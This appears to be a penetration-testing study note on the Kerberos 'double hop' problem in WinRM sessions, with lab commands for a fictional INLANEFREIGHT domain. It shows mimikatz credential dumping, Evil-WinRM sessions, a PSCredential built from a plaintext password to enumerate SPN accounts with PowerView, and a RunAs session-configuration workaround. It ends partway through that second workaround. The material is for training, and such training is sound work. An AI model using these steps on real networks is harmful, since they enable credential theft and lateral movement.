---
description: >-
  A problem that arises when an attacker attempts to use Kerberos authentication
  across two (or more) hops
---

# Kerberos "Double Hop" Problem

Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access

* When we authenticate via kerberos, we get a ticket that allow us to accesss the **requested** service
* When we authenticate with password, the NTLM has is stored and can be use other places.

### Background

The Double Hop problem occurs when using WinRM/Powershell, since the default authentication only provides a ticket to access a specific resource. This will cause issue when privesc or access file share from remote shell.

* Although the user has the rights to perform actions but the access is denied.
* When using 2 or more connections with WinRM, the password is never cached
* Mimikatz will show that all credentials are blank because we used kerberos to authen

**Check logonpasswords for backupadm**

```powershell-session
PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

> There will be no hash for backupadm in the above output

Although there are process running under the backupadm user.

```powershell-session
[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
wsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\backupadm
tasklist.exe                  6532 Services                   0      7,988 K Unknown         INLANEFREIGHT\backupadm 
conhost.exe                   7048 Services                   0     12,656 K Unknown         INLANEFREIGHT\backupadm
```

### Workarounds

A few workarounds for the double-hop issue are covered in [this post](https://posts.slayerlabs.com/double-hop/). We can use a "nested" `Invoke-Command` to send credentials (after creating a PSCredential object) with every request, so if we try to authenticate from our attack host to host A and run commands on host B, we are permitted.

### Workaround #1: PSCredential Object

After connecting to a remote host with domain credentials, we import PowerView and then try to run a command.

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
# This will error because we can't pass authentication to DC to query SPN
```

If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

So now, let's set up a PSCredential object and try again. First, we set up our authentication.

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```

Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

### Workaround #2: Register PSSession Configuration

Let's start by first establishing a WinRM session on the remote host.

```powershell-session
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

```powershell-session
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x11e387

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
       Start Time: 6/28/2022 9:09:19 (local)
       End Time:   6/28/2022 19:09:19 (local)
       Renew Time: 0
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x8 -> ASC
       Kdc Called:
```

We also cannot interact directly with the DC using PowerView

```powershell-session
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname
# This will error like before
```

One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.

```powershell-session
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

Once this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.





















